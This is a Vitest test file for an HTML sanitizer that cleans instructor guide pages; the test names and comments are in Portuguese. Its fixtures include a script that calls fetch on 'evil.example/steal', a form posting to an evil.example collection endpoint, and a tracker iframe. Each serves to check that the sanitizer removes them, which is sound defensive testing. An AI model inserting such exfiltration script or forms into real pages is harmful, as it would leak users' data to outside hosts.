import { describe, expect, it } from 'vitest';
import { sanitizeGuiaHtml } from '../../../lib/guias-instrutor/html-sanitizer';

const CLEAN_SAMPLE = `<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="utf-8"/><title>Guia</title>
<style>.toolbar{display:none!important}</style></head>
<body><div class="toolbar"><button onclick="window.print()">Imprimir</button></div>
<section><img src="../assets/logo.png"/><h1>Guia do Instrutor</h1></section>
</body></html>`;

describe('sanitizeGuiaHtml', () => {
  it('remove scripts arbitrários e reporta a contagem', () => {
    const html = `<html><body><script>fetch('https://evil.example/steal')</script><p>ok</p></body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.scriptsRemovidos).toBe(1);
    expect(result.html).not.toContain('<script');
    expect(result.aprovado).toBe(true);
  });

  it('remove iframes, forms e referências externas', () => {
    const html = `<html><body>
      <iframe src="https://tracker.example/x"></iframe>
      <form action="https://evil.example/collect"><input name="x"/></form>
      <a href="https://external.example/">link</a>
    </body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.html).not.toContain('<iframe');
    expect(result.html).not.toContain('<form');
    expect(result.aprovado).toBe(true);
  });

  it('remove handlers de evento inline (onclick etc.)', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.html).not.toMatch(/onclick=/i);
    expect(result.aprovado).toBe(true);
  });

  it('rejeita referência a localhost', () => {
    const html = `<html><body><a href="http://localhost:8787/admin">debug</a></body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.aprovado).toBe(false);
    expect(result.alertas.join(' ')).toMatch(/localhost/i);
  });

  it('preserva conteúdo legítimo (imagem local, texto)', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.html).toContain('src="../assets/logo.png"');
    expect(result.html).toContain('Guia do Instrutor');
  });

  it('não sobra script/iframe/form residual em HTML limpo', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.aprovado).toBe(true);
    expect(result.alertas.filter((a) => a.includes('residual'))).toHaveLength(0);
  });
});
